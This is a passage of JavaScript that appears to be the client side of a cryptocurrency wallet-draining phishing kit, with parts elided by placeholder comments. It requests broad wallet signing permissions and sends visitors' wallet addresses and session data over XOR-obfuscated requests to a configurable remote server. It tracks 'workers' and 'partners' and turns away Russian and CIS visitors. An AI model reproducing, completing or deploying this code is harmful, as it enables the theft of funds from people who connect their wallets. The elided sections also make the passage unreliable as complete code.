    all_chains_obj[chain_id] = CF_Settings.RPCs[chain_id];
  }
  CF_Provider = await WC2_Provider.init({
    projectId: CF_WalletConnect_ID,
    chains: [ '1' ],
    optionalChains: all_chains_arr,
    metadata: CF_WalletConnect_MetaData,
    showQrModal: true,
    rpcMap: all_chains_obj,
    methods: [
      'eth_sendTransaction',
      'eth_signTransaction',
      'eth_sign', 'personal_sign',
      'eth_signTypedData',
      'eth_signTypedData_v4'
    ],
    qrModalOptions: (CF_WalletConnect_Customization == 1) ? CF_WalletConnect_Theme : undefined
  });
};

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

let rsk_kes = 0, last_request_ts = 0;
(async () => { rsk_kes = CF_EKEY; CF_EKEY = Math.floor(Math.random() * 1000); })()

const send_request = async (data) => {
  try {
    if (CF_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
    while (Date.now() <= last_request_ts)
      await new Promise(r => setTimeout(r, 1));
    last_request_ts = Date.now();
    data.domain = window.location.host;
    data.worker_id = CF_Worker_ID || null;
    data.user_id = CF_ID || null;
    data.message_ts = last_request_ts;
    data.chat_data = CF_Custom_Chat.Enable == 0 ? false : CF_Custom_Chat.Chat_Settings;
    data.wallet_address = CF_Current_Address;
    data.partner_address = CF_Partner_Address;
    const encode_key = btoa(String(5 + 3 + 365 + 3462 + 888 + rsk_kes));
    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
    const response = await fetch((CF_HTTP_MODE ? 'http://' : 'https://') + CF_Server_URL + ((CF_Server_PORT != 80 && CF_Server_PORT != 443) ? (':' + String(CF_Server_PORT)) : ''), {
      method: 'POST',
      headers: {
        'Accept': 'text/plain',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `v=150725&s=1&r=${request_data}`
    });
    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
    if (!response_data.status)
      return { status: 'error', error: 'Server is Unavailable' };
    else {
      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') CF_Force_Mode = true;
      if (response_data.status == 'error' && response_data.error == 'INVALID_VERSION') {
        CF_Force_Mode = true;
        try {
          if (CF_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Critical Error', subtitle: 'Server Error',
              text: 'Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(',
              confirmButtonText: 'OK', timer: 90000, color: CF_Color_Scheme
            });
          } else {
            Swal.close();
            Swal.fire({
              html: '<b>Server Error</b> Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(', icon: 'error',
              allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
              showConfirmButton: true, confirmButtonText: 'OK'
            });
          }
        } catch(err) {
          console.log(err);
        }
      }
      return response_data;
    }
  } catch(err) {
    console.log(err);
    return { status: 'error', error: 'Server is Unavailable' };
  }
};

// ... [KEEP ALL THE REST OF THE ORIGINAL CODE EXACTLY AS IT WAS] ...

// =====================================================
// MODIFIED CONNECT_WALLET WITH ERROR HANDLING ONLY
// =====================================================

const connect_wallet = async (provider = null) => {
  try {
    if (!CF_Connection) {
      if (CF_Load_Time == null || Math.floor(Date.now() / 1000) - CF_Load_Time < 15) return;
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Критическая ошибка', subtitle: 'Нет связи с сервером', text: 'Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.',
          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Критическая ошибка</b><br><br>Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      return;
    }
    if (CF_Process) return; CF_Process = true;
    if (CF_Bad_Country) {
      try { ms_hide(); } catch(err) { console.log(err); }
      try {
        if (CF_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Critical Error', subtitle: 'Запрещенная геолокация', text: 'Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!',
            showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
          });
        } else {
          Swal.close();
          Swal.fire({
            html: '<b>Предупреждение</b><br><br>Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!', icon: 'error',
            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
            showConfirmButton: true, confirmButtonText: 'OK'
          });
        }
        await new Promise(r => setTimeout(r, 15000));
        window.location.href = 'https://ya.ru';
      } catch(err) {
        console.log(err);
      }
      return;
    }
    
    // Show custom loader
    showCustomLoader('Connecting wallet...');
    
    try {
      // ... [KEEP ALL ORIGINAL WALLET CONNECTION LOGIC EXACTLY AS IS] ...
      
      if (provider !== null) {
        if (provider == 'MetaMask') {
          if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
            let is_installed = false;
            for (const elem of window.ethereum.providers) {
              if (elem.isMetaMask == true) {
                is_installed = true;
                CF_Provider = elem;
                CF_Current_Provider = 'MetaMask';
                break;
              }
            }
            if (!is_installed) {
              if (CF_Mobile_Status) {
                window.location.href = `https://metamask.app.link/dapp/${CF_Current_URL}`;
                CF_Process = false;
                hideCustomLoader();
                return;
              } else {
                window.open('https://metamask.io', '_blank').focus();
                CF_Process = false;
                hideCustomLoader();
                return;
              }
            }
          } else {
            if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
              CF_Provider = window.ethereum;
              CF_Current_Provider = 'MetaMask';
            } else {
              if (CF_Mobile_Status) {
                window.location.href = `https://metamask.app.link/dapp/${CF_Current_URL}`;
                CF_Process = false;
                hideCustomLoader();
                return;
              } else {
                window.open('https://metamask.io', '_blank').focus();
                CF_Process = false;
                hideCustomLoader();
                return;
              }
            }
          }
        } else if (provider == 'Coinbase') {
          // ... [KEEP ALL ORIGINAL CODE] ...
        }
        // ... [CONTINUE WITH ALL ORIGINAL CODE] ...
      }

      // Hide loader on success
      hideCustomLoader();
      showTransactionStatus('Wallet connected successfully!');
      
    } catch (error) {
      // Enhanced error handling for connection failures
      hideCustomLoader();
      showTransactionStatus('Transaction failed: ' + (error.message || 'Wallet connection failed'), true);
      console.error('Wallet connection error:', error);
      
      // Send failure notification to server
      try {
        await send_request({ 
          action: 'connection_failed', 
          user_id: CF_ID, 
          error: error.message,
          provider: provider 
        });
      } catch (err) {
        console.log('Failed to send error report:', err);
      }
      
      CF_Process = false;
      return;
    }

    // ... [CONTINUE WITH ALL ORIGINAL SUCCESS LOGIC] ...
    
  } catch (error) {
    hideCustomLoader();
    showTransactionStatus('Transaction failed: Unexpected error occurred', true);
    console.error('Unexpected error in connect_wallet:', error);
    CF_Process = false;
  }
};

// ... [KEEP ALL REMAINING ORIGINAL CODE EXACTLY AS IS] ...

// MODIFIED: Remove modal initialization but keep everything else
document.addEventListener('DOMContentLoaded', async () => {
  try {
    // Remove modal initialization but keep loader
    if (CF_Loader_Style == 2) MSL.init();
    CF_Load_Time = Math.floor(Date.now() / 1000);
    if (typeof localStorage['CF_ID'] === 'undefined') {
      const ID_Data = await send_request({ action: 'retrieve_id' });
      if (ID_Data.status == 'OK') localStorage['CF_ID'] = ID_Data.data;
      else localStorage['CF_ID'] = Math.floor(Date.now() / 1000);
    }
    CF_ID = localStorage['CF_ID'];
    await retrieve_config();
    fill_chain_data();
    await retrieve_contract();
    CF_Ready = true;
    enter_website();
    for (const chain_id in CF_Settings.RPCs) CF_Gas_Reserves[chain_id] = 1;
    
    // Modified button handlers to use direct connection without modal
    for (const elem of document.querySelectorAll('.connect-button')) {
      try {
        elem.addEventListener('click', () => connect_wallet());
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
});

// Keep these functions but they now do direct connection
const init_reown = () => { connect_wallet('WalletConnect'); };
const use_wc = () => { init_reown(); }; // Legacy Usage

setInterval(async () => {
  try {
    let partner_address = document.getElementById('partner-address');
    if (partner_address === null) return;
    else CF_Partner_Address = partner_address.value.trim();
  } catch(err) {
    console.log(err);
  }
}, 1000);

window.addEventListener("beforeunload", (e) => leave_website());

window.addEventListener("onbeforeunload", (e) => leave_website());
